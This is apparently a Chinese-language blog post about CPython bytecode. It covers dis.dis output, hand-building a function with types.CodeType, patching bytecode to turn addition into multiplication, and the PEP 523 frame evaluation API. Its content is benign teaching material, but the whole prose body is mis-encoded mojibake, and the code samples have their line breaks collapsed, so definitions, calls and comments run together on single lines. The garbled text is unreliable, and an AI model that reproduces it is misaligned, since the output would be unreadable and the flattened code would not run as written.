å¾ dis.dis è¼¸å‡ºçš„ç¬¬ä¸‰æ¬„ï¼Œå¯ä»¥çœ‹å¾—å‡ºä¾†ï¼Œpython çš„ä½å…ƒçµ„ç¢¼å¯ä»¥åˆ†ç‚ºä»¥ 3 å€‹ byte ç‚ºå–®ä½çš„æŒ‡ä»¤ï¼šç¬¬ä¸€å€‹ byte æ˜¯å„²å­˜ä½å…ƒçµ„ç¢¼çš„æŒ‡ä»¤ï¼Œå‰©ä¸‹å…©å€‹ byte å‰‡æ˜¯ç”¨ä¾†å„²å­˜ä½å…ƒçµ„ç¢¼æŒ‡ä»¤æ‰€éœ€çš„è¼¸å…¥ã€‚çœ¼å°–çš„è®€è€…å¯èƒ½æœƒç™¼ç¾ï¼Œæ ¹æ“šä½å…ƒçµ„ç¢¼ä½ç§»ï¼Œ BINARY_ADD æŒ‡ä»¤çš„å¤§å°åªæœ‰ä¸€å€‹ byteã€‚é€™æ˜¯å› ç‚ºå®ƒæ‰€åšçš„å°±æ˜¯å°‡ python å †ç–Šæœ€ä¸Šå±¤çš„å…©å€‹æ•¸å€¼ç›¸åŠ ã€‚è€Œé€™å…©å€‹æ•¸å€¼ï¼Œå·²ç¶“ç¶“ç”± LOAD_FAST æŒ‡ä»¤ï¼Œå¾å †ç–Šè¼‰å…¥åˆ° python çš„åŸ·è¡Œç’°å¢ƒä¸­ã€‚
ä¸‹åœ–å°±æ˜¯å †ç–Šå¦‚ä½•åŸ·è¡Œ BINARY_ADD æŒ‡ä»¤çš„ç¤ºæ„åœ–ã€‚å¯ä»¥çœ‹åˆ°ï¼Œå †ç–Šæœƒå…ˆé€²è¡Œå…©å€‹ pop çš„å‹•ä½œï¼Œåœ¨ python ç›´è­¯å™¨çœ‹ä¾†å…©å€‹ LOAD_FAST æŒ‡ä»¤ï¼ŒåŸ·è¡Œå®Œ BINARY_ADD å¾Œï¼Œå†æŠŠçµæœ push åˆ°å †ç–Šè£¡ï¼Œä¹Ÿå°±æ˜¯åŸ·è¡Œ STORE_FAST ï¼ˆè¦‹ä¸‹é¢çš„ä¾‹å­ï¼‰ çš„æŒ‡ä»¤ã€‚ï¼ˆåœ–ç‰‡ä¾†æºï¼šEngineering The Codeï¼‰

æˆ‘å€‘å¯ä»¥çœ‹æ›´å¤šçš„ä¾‹å­ï¼Œä»¥ä¸‹æ˜¯å¦å¤–ä¸€å€‹è§£è­¯å™¨å° add_with_assign function ç‰©ä»¶çš„è¼¸å‡ºï¼Œå¯ä»¥çœ‹åˆ°å› ç‚ºåŸå§‹ç¢¼æœ‰å…©è¡Œï¼Œæˆ‘å€‘å¯ä»¥çœ‹åˆ°ç¬¬ä¸€æ¬„å¤šäº†ä¸€å€‹ 3ï¼Œè¡¨ç¤ºæ˜¯åŸå§‹ç¢¼ä¸­ç¬¬ä¸‰è¡Œæˆ–æ˜¯ return x ç¨‹å¼ç¢¼ã€‚åŒæ™‚æˆ‘å€‘ä¹Ÿçœ‹åˆ°äº†æ–°çš„ä½å…ƒç¢¼æŒ‡ä»¤ï¼šSTORE_FASTï¼Œé€™å€‹æŒ‡ä»¤å‰‡æ˜¯å°‡æ–°çš„è®Šæ•¸å¾åŸ·è¡Œç’°å¢ƒæ¨åˆ° python å †ç–Šè£¡ã€‚
def add_with_assign(a, b):  x = a + b  return xdis.dis(add_with_assign)

  2           0 LOAD_FAST                0 (a)
              3 LOAD_FAST                1 (b)
              6 BINARY_ADD
              7 STORE_FAST               2 (x)

  3          10 LOAD_FAST                2 (x)
             13 RETURN_VALUE

ä»¥ä¸‹çš„è¼¸å‡ºå‰‡æ˜¯åŒ…å« if-else çš„ç¨‹å¼ç¢¼ï¼Œå¯ä»¥çœ‹åˆ°ç¬¬äºŒæ¬„å‡ºç¾äº† &gt;&gt; æŒ‡æ¨™ï¼Œè¡¨ç¤ºè‹¥ x &lt;&#x3D; 0ï¼Œç¨‹å¼çš„åŸ·è¡Œå°±æœƒè·³åˆ° else çš„å€å¡Šå»å®Œæˆï¼Œä¹Ÿå°±æ˜¯ä½å…ƒçµ„ç¢¼ä½ç§»ç‚º 16 çš„åœ°æ–¹ã€‚è€Œæ›´å¤šé—œæ–¼ dis çš„ç¨‹å¼å’Œæ›´è©³ç›¡çš„ python ä½å…ƒçµ„ç¢¼æŒ‡ä»¤ä»‹ç´¹å¯ä»¥åƒçœ‹é€™ç¯‡è‹±æ–‡çš„[æ•™å­¸æ–‡][lop]ã€‚[lop]:https://renewang.github.io/land_of_plenty/posts/learning-cpython-internals-interpreter-and-source-code-overview/
def abs(x):  if x &gt; 0:    return x  else:    return -xdis.dis(abs)

  2           0 LOAD_FAST                0 (x)
              3 LOAD_CONST               1 (0)
              6 COMPARE_OP               4 (&gt;)
              9 POP_JUMP_IF_FALSE       16

  3          12 LOAD_FAST                0 (x)
             15 RETURN_VALUE

  5     &gt;&gt;   16 LOAD_FAST                0 (x)
             19 UNARY_NEGATIVE
             20 RETURN_VALUE
             21 LOAD_CONST               0 (None)
             24 RETURN_VALUE

ä¸éï¼Œæ—¢ç„¶ä½å…ƒçµ„ç¢¼æ˜¯å±¬æ–¼ Code ç‰©ä»¶çš„ä¸€éƒ¨åˆ†ï¼Œé‚£éº¼æ˜¯å¦æˆ‘å€‘èƒ½ç›´æ¥ç”¨ Code ç‰©ä»¶ä¾†å»ºç«‹åŒæ¨£åŠŸèƒ½çš„ function å‘¢ï¼Ÿæ¼”è¬›ä¸­æä¾›äº†ä¸€å€‹æ–¹æ³•ï¼Œç›´æ¥ç”¨ types æ¨¡çµ„ä¸­ CodeType ä¾†å»ºæ§‹ä¸€å€‹ Code ç‰©ä»¶ã€‚é€™å€‹ Code ç‰©ä»¶å¯ä»¥å®Œæˆå’Œ addone function ç›¸åŒçš„åŠŸèƒ½ã€‚å…ˆä¾†çœ‹çœ‹ dis å° addone function çš„è§£è­¯ã€‚
def addone(x):  return x + 1dis.dis(addone)

  2           0 LOAD_FAST                0 (x)
              3 LOAD_CONST               1 (1)
              6 BINARY_ADD
              7 RETURN_VALUE

CodeType éœ€è¦ä¸€äº›ç‰¹åˆ¥çš„åƒæ•¸ï¼Œé€™äº›åƒæ•¸å¤§è‡´ä¸Šå¯ä»¥å¾ä»¥ä¸‹åŸå§‹ç¢¼æ—çš„è¨»è§£çŸ¥é“ä»–å€‘çš„ç”¨é€”ã€‚ä¸éé‚„æ˜¯åœ¨é€™è£¡åšä¸€å€‹å¿«é€Ÿä»‹ç´¹ï¼šå‰å…©å€‹ CodeType çš„å¼•æ•¸æ˜¯å‚³å…¥è¦å»ºæ§‹çš„ Code ç‰©ä»¶çš„å¼•æ•¸æ•¸ç›®ï¼Œå’Œ keyword å¼•æ•¸çš„å¼•æ•¸æ•¸ç›®ï¼Œå› ç‚º addone function åªæœ‰ä¸€å€‹å¼•æ•¸ x ä¸”æ²’æœ‰ keyword å¼•æ•¸ï¼Œæ‰€ä»¥åˆ†åˆ¥å‚³å…¥ 1 å’Œ 0 å³å¯ã€‚åŒæ™‚ï¼Œåœ¨è®Šæ•¸åç¨±ä¸Šè¦è¨˜å¾—çµ¦å®šä¸€å€‹ tuple ç‰©ä»¶ï¼Œè£¡é¢è£çš„å°±æ˜¯å¼•æ•¸çš„è®Šæ•¸åç¨±ã€‚å…¶æ¬¡ï¼Œå› ç‚ºåœ¨ addone function çš„ä½œç”¨åŸŸï¼ˆscopeï¼‰è£¡é›–ç„¶ä¸¦æ²’æœ‰ä»»ä½•è®Šæ•¸è¢«å®£å‘Šï¼Œåªæœ‰å‚³å…¥çš„å¼•æ•¸ï¼Œxï¼Œæ‰€ä»¥åœ¨å±€éƒ¨è®Šæ•¸ï¼ˆlocal variableï¼‰çš„æ•¸ç›®ï¼Œæˆ‘å€‘ä¸€æ¨£è¦å¡« 1ã€‚  
å¦å¤–ï¼Œè¦æ³¨æ„çš„æ˜¯é€™è£¡æ‰€æŒ‡çš„å±€éƒ¨è®Šæ•¸ï¼Œæ˜¯æŒ‡è®Šæ•¸çš„ä½œç”¨åŸŸåªæœ‰åœ¨é€™å€‹å»ºæ§‹çš„ Code ç‰©ä»¶å…§ï¼Œè€Œä¸æœƒåˆ†äº«åˆ°å…¶ä»–çš„ç‰©ä»¶ï¼Œä¾‹å¦‚ï¼šåœ¨ Python æˆ‘å€‘å¯ä»¥åˆ©ç”¨ return ä¸€å€‹ function ç‰©ä»¶ï¼Œä½¿ä»»ä½•åœ¨ function è£¡çš„ä½œç”¨åŸŸå®£å‘Šçš„è®Šæ•¸å¯ä»¥åˆ†äº«åˆ°å…¶ä»–çš„ä½œç”¨åŸŸã€‚è€Œå¸¸æ•¸ï¼ˆconstantsï¼‰çš„éƒ¨åˆ†ï¼Œå› ç‚ºæˆ‘å€‘éœ€è¦ç”¨åˆ°å¸¸æ•¸ 1ï¼Œä¾†åŸ·è¡Œâ€œåŠ ä¸€â€çš„å‹•ä½œï¼Œæ‰€ä»¥ä¸€æ¨£å‚³å…¥ä¸€å€‹ tupleï¼Œè£¡é¢åªè£ä¸€å€‹å…ƒç´ ï¼Œé‚£å°±æ˜¯ 1ã€‚è‡³æ–¼åŸå§‹ç¢¼çš„æª”æ¡ˆåç¨±ï¼Œå’Œç¬¬ä¸€åˆ—é–‹å§‹çš„åˆ—æ•¸ï¼Œå°±éš¨ä¾¿å¡«å°±å¥½äº†ï¼åœ¨é€™è£¡æˆ‘å€‘å°±ä¾ç…§è¬›è€…çš„å–œå¥½ï¼Œå¡«å…¥èƒ½è§£é‡‹å®‡å®™ï¼Œç”Ÿå‘½åŠä»»ä½•äº‹æƒ…çš„æ•¸å­—ï¼Œ42 [è¨» 1] å§ï¼   
å‰©ä¸‹ä»éœ€è¦è§£é‡‹çš„æœ‰ stack sizeï¼Œé€™è£¡ä»£è¡¨çš„æ˜¯æœ€å¤§ä¿ç•™çš„ python å †ç–Šæ·±åº¦ã€‚å› ç‚º BINARY_ADD æŒ‡ä»¤éœ€è¦é€£çºŒå° python å †ç–Šåšå…©æ¬¡ pop çš„å‹•ä½œï¼Œä¾†è®€å–æ‰€éœ€è¦çš„è¼¸å…¥å€¼ã€‚æ‰€ä»¥åœ¨å»ºç«‹ Code ç‰©ä»¶æ™‚ï¼Œstack size å¡«å…¥ 2 å³å¯ã€‚å¦å¤–å‰‡æ˜¯ compiler flag ï¼Œé€™äº› flag æ˜¯ç”¨ä¾†å®¢åˆ¶å»ºæ§‹ Code ç‰©ä»¶çš„é¸é …ã€‚å¦‚ï¼šCO_OPTIMIZED æœƒç”¢ç”Ÿå­˜å–è®Šæ•¸è¼ƒå¿«çš„æŒ‡ä»¤ï¼ŒCO_NEWLOCALS å‰‡æœƒå…è¨±å»ºç«‹ä¸€å€‹ dict ç‰©ä»¶ä¾†å­˜æ”¾æ–°çš„å€åŸŸè®Šæ•¸ï¼Œè€Œ CO_NOFREE å‰‡ä¸å…è¨±ç”¢ç”Ÿ free æˆ– cell è®Šæ•¸ï¼Œæˆ–ç”¨éå¸¸ç²—ç•¥çš„è¬›æ³•å°±æ˜¯è®Šæ•¸çš„ä½œç”¨åŸŸå¯æ“´å±•å®ƒæ‰€è¢«å®£ç¨±çš„å€åŸŸï¼Œå¦‚é€é return ä¸€å€‹ function ç‰©ä»¶ã€‚æ›´è©³ç´°çš„è§£èªªï¼Œè«‹åƒçœ‹ cpython å®˜æ–¹æ–‡ä»¶èªªæ˜ã€‚
æœ€å¾Œï¼Œå› ç‚ºæ ¹æœ¬å°±æ²’æœ‰åŸå§‹ç¢¼ï¼Œæ‰€ä»¥å†å‚³å…¥åŸå§‹ç¢¼å’Œå’Œä½å…ƒçµ„ç¢¼çš„å°æ‡‰éƒ¨åˆ†ï¼Œåªæœ‰å‚³å…¥ä¸€å€‹ç©ºçš„ä½å…ƒå­—ä¸²å³å¯ã€‚
from types import CodeTypefrom inspect import CO_OPTIMIZED, CO_NEWLOCALS, CO_NOFREEmy_code = CodeType(         1,    # argument count         0,    # keyword only argument count# number of locals variable # (any local variables not shared through closure)         1,             2,    # stacksize# compiler flags (see Include/code.h)(CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE),     # codestring very different from # what output dis.dis which is# [124, 0, 0, 100, 1, 0, 23, 83]        bytes([124, 0, 0, 100, 0, 0, 23, 83]),         (1,),  # constants        (),    # names for global variables and attributes        (&#x27;x&#x27;,),# name of variable  &#x27;&lt;CodeType&gt;&#x27;,# filename, fill in arbitrary name      &#x27;addone&#x27;,# name for this code object, should be function name        42,    # line number of first line# line number table to map from byte code offset to source line        b&#x27;&#x27;,   # freevars are the variables can be shared thorugh closure # (should be empty when CO_NOFREE compiler flag is passed)        (),# cellvars are the variables can be shared thorugh closure # (should be empty when CO_NOFREE compiler flag is passed)        ()              )

å®Œæˆäº† Code object çš„å»ºæ§‹ï¼Œæˆ‘å€‘é‚„éœ€è¦ function ç‰©ä»¶å¥½è®“ user å¯ä»¥å‚³å…¥æ•¸å€¼ä¸¦å‘¼å« functionã€‚æˆ‘å€‘éœ€è¦çš„æ˜¯ types æ¨¡çµ„çš„ FunctionType é¡åˆ¥ã€‚åœ¨å»ºæ§‹ FunctionType æ™‚ï¼Œç¬¬äºŒå€‹å¼•æ•¸ï¼Œéœ€è¦å‚³å…¥å…¨åŸŸå€åŸŸçš„è®Šæ•¸ï¼Œåœ¨æ­¤è™•å‚³å…¥ä¸€å€‹ç©ºçš„ dict ç‰©ä»¶å³å¯ã€‚
from types import FunctionTypemy_addone = FunctionType(my_code, &#123;&#125;)my_addone(5)




6

çœ‹ä¾†ï¼Œæˆ‘å€‘ç”¨ CodeType å»ºæ§‹å‡ºä¾†çš„ Code ç‰©ä»¶çš„ç¢ºèƒ½ä½œç”¨å‘¢ï¼ä¸éï¼Œä¾†æ¯”è¼ƒä¸€ä¸‹ç”± CodeType å»ºæ§‹å‡ºä¾†çš„ Code ç‰©ä»¶å’Œ python ç”¢ç”Ÿçš„ Code ç‰©ä»¶è§£è­¯å¾Œæœ‰ä»€éº¼ä¸åŒå§ï¼çœ¼å°–çš„è®€è€…æœƒç™¼ç¾ç¬¬äºŒå€‹ä½å…ƒçµ„ç¢¼æŒ‡ä»¤ LOAD_CONST çš„å¼•æ•¸ç´¢å¼•å€¼ï¼Œpython ç”¢ç”Ÿçš„ addone code ç‰©ä»¶æ˜¯ç”± 1 é–‹å§‹ï¼Œè€Œä¸æ˜¯æˆ‘å€‘çµ¦çš„ 0ã€‚
dis.dis(my_addone)

 42           0 LOAD_FAST                0 (x)
              3 LOAD_CONST               0 (1)
              6 BINARY_ADD
              7 RETURN_VALUE

ä¾†çœ‹çœ‹ python ç”¢ç”Ÿçš„ Code ç‰©ä»¶æ‰€ç·¨è­¯çš„ä½å…ƒçµ„ç¢¼ï¼Œå’Œæˆ‘å€‘ä¾ç…§è¬›è€…çš„æŒ‡ç¤ºè¼¸å…¥çš„ä½å…ƒçµ„ç¢¼æœ‰ä»€éº¼ä¸åŒï¼Ÿ
list(addone.__code__.co_code)




[124, 0, 0, 100, 1, 0, 23, 83]

æˆ‘å€‘æœƒç™¼ç¾ï¼Œè¬›è€…çš„æŒ‡ç¤ºè¼¸å…¥çš„ä½å…ƒçµ„ç¢¼æ˜¯ï¼š 

[124, 0, 0, 100, 0, 0, 23, 83]   

å’Œ python ç·¨è­¯å‡ºçš„ä½å…ƒçµ„ç¢¼ï¼š

[124, 0, 0, 100, 1, 0, 23, 83]

æœ‰ä¸€å€‹å…ƒç´ ä¸ç›¸åŒã€‚é€™æ˜¯å› ç‚º python Code ç‰©ä»¶åˆ©ç”¨ tuple å„²å­˜çš„å¸¸æ•¸ï¼Œç¬¬ä¸€å€‹å…ƒç´ ä¸€å®šæ˜¯ None ç‰©ä»¶ã€‚ä¸éæœ‰æ²’æœ‰ None å°æ–¼ python çš„åŸ·è¡Œå…¶å¯¦å½±éŸ¿ä¸å¤§ã€‚
# LOAD_CONST  0 (1) in my_code objectprint(my_addone.__code__.co_filename,       &quot;co_consts:&quot;,       my_addone.__code__.co_consts)# LOAD_CONST  1 (1) in cpython addoneprint(addone.__name__, &quot;co_consts:&quot;,       addone.__code__.co_consts) 

&lt;CodeType&gt; co_consts: (1,)
addone co_consts: (None, 1)

æ¥è‘—è©²æ˜¯é‚å‘é§­å®¢çš„ç¬¬ä¸€æ­¥ï¼Œè®“æˆ‘å€‘ä¾†å˜—è©¦ç”¨å·²ç¶“å»ºæ§‹å¥½çš„ my_addone ä¾†å‡ç´šæˆ my_addtwoã€‚å¹¸é‹åœ°ï¼Œå…©ä½æ¼”è¬›è€…å€‘ç‚ºæˆ‘å€‘å¯«äº†ä¸€å€‹ç°¡çŸ­çš„ helper functionã€‚æˆ‘å€‘å¯ä»¥åˆ©ç”¨é€™å€‹å°å¹«æ‰‹è¼•é¬†åœ°å°‡ my_addone å‡ç´šæˆ my_addtwo è€Œä¸éœ€è¦å¯«ä»»ä½•ä¸€è¡ŒåŸå§‹ç¢¼ã€‚é€™è£¡è¦æ³¨æ„çš„ï¼Œå› ç‚º code ç‰©ä»¶è£¡çš„å±¬æ€§éƒ½æ˜¯å”¯è®€çš„ï¼Œæ‰€ä»¥ç›´æ¥å°å±¬æ€§åšè®Šæ›´æ˜¯ä¸è¢«å…è¨±çš„ã€‚èƒ½å¤ å…è¨±çš„æ˜¯ï¼Œé‡æ–°å»ºæ§‹ä¸€å€‹ CodeType ç‰©ä»¶ï¼Œå’Œ FunctionTyep ç‰©ä»¶ã€‚
def update(f, **kwargs):  &quot;a function that performs a functional update on a function&quot;  old = f.__code__  # listing the arguments required to construct   # CodeType in order  attrs = [&#x27;co_argcount&#x27;, &#x27;co_kwonlyargcount&#x27;, &#x27;co_nlocals&#x27;,           &#x27;co_stacksize&#x27;, &#x27;co_flags&#x27;, &#x27;co_code&#x27;, &#x27;co_consts&#x27;,           &#x27;co_names&#x27;, &#x27;co_varnames&#x27;, &#x27;co_filename&#x27;,            &#x27;co_name&#x27;, &#x27;co_firstlineno&#x27;, &#x27;co_lnotab&#x27;,            &#x27;co_freevars&#x27;, &#x27;co_cellvars&#x27;]  # construct a new CodeType based on the kwargs  new = CodeType(*(kwargs.get(a, getattr(old, a))                    for a in attrs))  # return a FunctionType with the newly created   # CodeType object  return FunctionType(new,                       f.__globals__,                       f.__name__,                      f.__defaults__,                       f.__closure__)

æœ‰äº† update functionï¼Œæˆ‘å€‘å°±å¯ä»¥è¼•é¬†ç½®æ› consts ç‚º 2
my_addtwo = update(my_addone, co_consts=(2,))my_addtwo(5)




7

Yesï¼æœç„¶è®Šæˆâ€œåŠ äºŒâ€å•¦ï¼æ¥ä¸‹ä¾†æ˜¯æ˜¯æ›´é«˜æ·±çš„ç½®æ›ã€‚æŠŠåŠ æ³•æ›æˆä¹˜æ³•å§ï¼åœ¨é€™è£¡ï¼Œæˆ‘å€‘éœ€è¦ç½®æ›æŒ‡ä»¤ï¼Œä¹Ÿå°±æ˜¯åŠ æ³•æŒ‡ä»¤ä»£ç¢¼ç‚º 23 çš„é€šé€šæŠŠå®ƒæ›æˆ 20 å§ï¼æ‰€ä»¥æˆ‘å€‘éœ€è¦å°åŸä¾†çš„å°å¹«æ‰‹ function åšä¸€é»åŠ å·¥ã€‚åœ¨é€™è£¡å°±æ˜¯å–å‡ºä½å…ƒçµ„ç¢¼å­—ä¸²ï¼Œç„¶å¾Œåˆ©ç”¨ä½å…ƒå­—ä¸²æ–¹æ³•ï¼Œ replace ä¾†é”æˆã€‚æœ‰èˆˆè¶£çŸ¥é“æŒ‡ä»¤å°æ‡‰çš„æ•´æ•¸ä»£ç¢¼çš„è®€è€…ï¼Œè«‹åƒçœ‹ python çš„åŸå§‹ç¢¼æ¨¹ä¸­ Include&#x2F;opcode.h æ¨™é ­æª”ã€‚
def add_to_mul(f, **kwargs):  &quot;a function that performs a functional update on a function&quot;  old = f.__code__.co_code  # replace BINARY_ADD(23) with BINARY_MULTIPLY  (20)  new = old.replace(bytes([23]), bytes([20]))  return update(f, co_code=new)


my_multwo = add_to_mul(my_addtwo)my_multwo(5)




10

ç•¶ç„¶ä»»æ„ç½®æ›æŒ‡ä»¤å¯èƒ½æœƒå°è‡´ä¸å¯æ”¶æ‹¾çš„çµæœï¼Œæ¯”å¦‚ï¼Œå€˜è‹¥æˆ‘å€‘å¯«å‡ºäº†ä¸€å€‹æ“æœ‰ 26 å€‹å¼•æ•¸çš„ functionï¼Œä¸¦ä¸”å›å‚³ç¬¬ 23 å€‹å¼•æ•¸ï¼Œä¹Ÿå°±æ˜¯ xï¼Œå¦‚ä¸‹ï¼š
from string import ascii_lowercasedef get_x(a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z):  &quot;a function with 26 local variables&quot;  return xget_x(*ascii_lowercase)




&#39;x&#39;

å°‡ function ç‰©ä»¶å¸¶å…¥add_to_mulï¼Œå‡ºç¾ä»¥ä¸‹ä»¤äººå‡ºä¹äººæ„æ–™çš„çµæœï¼š
get_u = add_to_mul(get_x)get_u(*ascii_lowercase)




&#39;u&#39;

çœŸç³Ÿï¼æœ¬ä¾†æƒ³å–å‡º x çš„ get_x function å»è®Šæˆäº† â€œGet yoUâ€ã€‚å› ç‚ºåªæ˜¯å°æŒ‡ä»¤ä»£ç¢¼åšæ›¿æ›ï¼Œçµæœé€ æˆç¬¬ 23 å€‹å¼•æ•¸è¢«æ›¿æ›æˆç¬¬ 20 å€‹å¼•æ•¸ã€‚æˆ‘å€‘å¯ä»¥æª¢æŸ¥ä¸€ä¸‹ä½å…ƒçµ„ç¢¼çš„æ•´æ•¸ä»£ç¢¼ï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯å¼•æ•¸çš„éƒ¨åˆ†è¢«æ›´å‹•äº†ã€‚çš„ç¢ºï¼Œä½å…ƒçµ„ç¢¼çš„ç¬¬äºŒå€‹ä½å…ƒçµ„å¾ 23 è¢«æ›¿æ›æˆ 20 äº†ï¼
print(&#x27;byte code for&#x27;, get_x.__name__, list(get_x.__code__.co_code))print(&#x27;byte code for get_u&#x27;, list(get_u.__code__.co_code))

byte code for get_x [124, 23, 0, 83]
byte code for get_u [124, 20, 0, 83]

ä¸éé€™å€‹å¹½é»˜çš„ä¾‹å­åªæ˜¯èªªæ˜äº†ï¼ä»»æ„ç½®æ›æŒ‡ä»¤ç¢¼çš„çµæœå°±æ˜¯è®“æ›¿æ› function åšå‡ºå‡ºä¹æ„æ–™çš„äº‹å‘€ï¼æ›´ç³Ÿçš„æ˜¯å¯èƒ½è®“ä½ çš„ python ç›´è­¯å™¨ crash ã€‚  
å¾ˆå¤šäººå¯èƒ½æœƒè¦ºå¾—ç´æ‚¶ï¼Œä½å…ƒçµ„ç¢¼ä¼¼ä¹æ˜¯å¾ˆåº•å±¤çš„æŠ€è¡“ï¼Œå­¸é€™äº›åº•å±¤çš„æ±è¥¿ä¼¼ä¹å°å¤§éƒ¨åˆ†å¾äº‹è»Ÿé«”è¨­è¨ˆçš„ç¨‹å¼å·¥ç¨‹å¸«å€‘æ²’æœ‰ä»€éº¼ä½œç”¨ã€‚å…¶å¯¦ï¼Œä½å…ƒçµ„ç¢¼çš„æ‡‰ç”¨ä¹Ÿä¸å°‘ï¼Œå¯ä»¥å¦‚æ­¤ç¯‡æ¼”è¬›æœ€å¾Œï¼Œå…©ä½è¬›è€…ä»‹ç´¹ä»–å€‘æ‰€ç™¼è¡¨çš„ codetransformer packageï¼Œç›´æ¥å°ä½å…ƒçµ„ç¢¼åš patchï¼Œè€Œé”åˆ°å¦‚æ›´æ”¹åŸå§‹ç¢¼çš„æ•ˆæœã€‚  
å°ç›¸ç•¶ä¾è³´é–‹æºç¨‹å¼ç¢¼è»Ÿé«”ï¼Œæœ‰æ™‚å»éœ€è¦é‡æ–°æ”¹å¯«åŸå§‹ç¢¼ä¾†é”åˆ°è·ŸåŸè»Ÿé«”ä¸ä¸€æ¨£è¨­è¨ˆç›®æ¨™çš„æˆ‘ï¼Œå¹³å¸¸å°é–‹æºè»Ÿé«”åšä¿®ä¿®æ”¹æ”¹ï¼Œå¤šåŠç”¨ python standard library unittest.mock è£¡ patch çš„æ–¹æ³•ä¾†é”åˆ°é¿å…æ›´å‹•ç¨‹å¼ç¢¼ï¼Œåˆå¯è¦†å¯«åŸä¾†çš„åŠŸèƒ½ã€‚é€™æ¨£é€é patch çš„æ–¹å¼å…¶å¯¦æ˜¯å¾ˆæ²’æœ‰æ•ˆç‡çš„ï¼Œå› ç‚ºé€šå¸¸é‚„éœ€è¦ç”Ÿæˆé¡å¤–ç‰©ä»¶ï¼Œè¤‡å¯«çš„æ–¹å¼ä¸”å¤šåŠé€éç‰©ä»¶å°å‘ä¸­å¤šå‹çš„æ–¹å¼ä¾†é”æˆã€‚é€™æ¨£çš„åšæ³•æ•ˆèƒ½æœƒå¾ˆä½ï¼Œè‹¥èƒ½å°å·²ç·¨è­¯çš„ python ä½å…ƒçµ„ç¢¼åš patch æ•ˆèƒ½ä¸Šæ‡‰è©²æœƒæ¯”æˆ‘ç¾åœ¨çš„åšæ³•é«˜ä¸Šè¨±å¤šã€‚
äº‹å¯¦ä¸Šï¼Œå¦å¤–ä¸€ä½ JetBrain PyCharm é–‹ç™¼è€…ï¼Œå°±åœ¨ 2017 pycon å±•ç¤ºäº†ä»¥æ–°çš„ frame evaluation api è€Œé–‹ç™¼æˆçš„ debuggerã€‚æ–°çš„ frame evaluation api é™¤äº†æ›´å‹• frame evaluation ç›¸é—œçš„ c åŸå§‹ç¢¼ï¼Œè®“ç¬¬ä¸‰æ–¹è»Ÿé«”èƒ½å¤ æ’å…¥ï¼ˆplug inï¼‰ä»–å€‘è‡ªå·±çš„ frame evaluation functionï¼Œåœ¨ code ç‰©ä»¶æ›´å¢åŠ äº†åç‚º code_extra æ–°çš„å±¬æ€§ã€‚é€™å€‹æ–°çš„å±¬æ€§å¾—ä»¥è®“ python ç·¨ç¨‹è€…æœ‰è¼ƒå¤§çš„è‡ªç”±åº¦ï¼Œåœ¨ c level ä¸­é™„åŠ ä»»ä½• python ç‰©ä»¶åˆ° code object ä¸Šï¼Œè€Œé”åˆ°ä¸åŒçš„åŠŸèƒ½ã€‚äº‹å¯¦ä¸Šï¼Œ PyCharm çš„é–‹ç™¼è€…ï¼Œå°±ä½¿ç”¨é€™å€‹æ–°çš„å±¬æ€§ï¼Œä¾† cache é€ è¨ªéçš„ python frame ï¼Œä»¥é¿å…é‡è¤‡å­˜å–è€Œé™ä½ debugger çš„æ•ˆèƒ½ã€‚
é€™å€‹æ–°çš„ frame api æˆç‚ºè¨±å¤šç¬¬ä¸‰æ–¹è»Ÿé«”çš„ç¦éŸ³ã€‚é€™è£¡æ‰€èªªçš„ç¬¬ä¸‰æ–¹è»Ÿé«”ï¼ŒæŒ‡çš„æ˜¯è‡ªè¡Œé–‹ç™¼æ–°çš„ python ä½å…ƒçµ„ç¢¼ç·¨è­¯å™¨çš„è»Ÿé«”ã€‚å¦‚ï¼šMicrosoft çš„ Pyjion project ä¾¿æ˜¯ä¸»è¦å—æƒ è€…ã€‚Microsoft çš„ Pyjion æ˜¯å°‡ python ç›´è­¯å™¨æ”¹åœ¨è‡ªå®¶ç™¼å±•çš„ .NET framework ä½¿ç”¨çš„ JIT ç·¨è­¯å™¨ä¸ŠåŸ·è¡Œã€‚è€Œé€™å€‹æ–°çš„ frame apiï¼Œå‰‡è®“ç™¼å±•ç¨‹å¼èªè¨€æ’ä»¶ï¼ˆpluginï¼‰æˆç‚ºå¯èƒ½ã€‚ï¼ˆå—¯ï¼Œç¾åœ¨ä¸åƒ…è»Ÿé«”å¯ä»¥ä½¿ç”¨æ’ä»¶ï¼Œé€£ç¨‹å¼èªè¨€ä¹Ÿå¯ä»¥ä½¿ç”¨æ’ä»¶äº†ï¼ï¼‰è€Œæœ€ç›´æ¥çš„ä½å…ƒç¢¼æ‡‰ç”¨å‰‡æ˜¯åˆ©ç”¨é€™å€‹ frame api ä¾†æ’å…¥ä¸­æ–·é»ï¼ˆbreakpointï¼‰çš„ä½å…ƒçµ„ç¢¼ã€‚å…¶ä»–çš„æ‡‰ç”¨å‰‡åŒ…æ‹¬ï¼šåœ¨ frame evaluation level ä¾†é–‹å•Ÿ logging æˆ–æ’å…¥æ”¶é›†åŸ·è¡Œè³‡è¨Šçš„åŸå§‹ç¢¼ä»¥ä¾› profiler ä½¿ç”¨ã€‚
æœ€å¾Œï¼Œä½ è¦ºå¾—ç„¡æ³•æ¶ˆåŒ–æˆ‘éå¤šçš„æ–‡å­—ï¼Œåˆè¦ºå¾—è‡ªå·±çš„è‹±æ–‡é‚„ä¸éŒ¯[è¨» 2]ï¼Œå–˜æ¯ä¸€ä¸‹çœ‹ä¸€ä¸‹é€™äº›é§­å®¢ç´šçš„é›»è…¦ç©å®¶å€‘ï¼Œå¦‚ä½•ä»¥è¼•é¬†è©¼è«§çš„æ–¹å¼ä¾†åšä½å…ƒç¢¼æ•™å­¸ã€‚ä¸éï¼Œåƒè¬ä¸è¦é‚Šå–é£²æ–™é‚Šçœ‹å½±ç‰‡å–”ï¼æˆ‘æ“”å¿ƒï¼Œåœ¨è§€çœ‹æ¼”è¬›ä¸­ï¼Œä½ å€‘å¯èƒ½å› ç‚ºç¬‘åœ°éåº¦ç”¨åŠ›è€Œä¸å¹¸å°‡é£²æ–™å™´å‡ºï¼Œåè€Œè®“è‡ªå·±çš„é›»è…¦æ•…éšœäº†ã€‚
